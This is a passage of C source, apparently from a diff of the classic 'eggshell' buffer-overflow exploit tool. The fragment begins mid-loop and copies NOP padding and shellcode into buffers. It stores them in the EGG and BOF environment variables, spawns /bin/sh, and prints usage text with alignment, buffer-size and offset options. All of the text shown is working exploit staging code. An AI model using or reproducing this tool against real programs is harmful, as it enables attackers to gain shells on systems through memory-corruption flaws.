+      *(ptr++) = nop[m];
+    }
+
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  bof[bsize - 1] = '\0';
+  egg[eggsize - 1] = '\0';
+
+  memcpy(egg,"EGG=",4);
+  putenv(egg);
+
+  memcpy(bof,"BOF=",4);
+  putenv(bof);
+  system("/bin/sh");
+}
+
+void usage(void) {
+  (void)fprintf(stderr,
+    "usage: eggshell [-a <alignment>] [-b <buffersize>] [-e <eggsize>] [-o <offset>]\n");
+}
+------------------------------------------------------------------------------
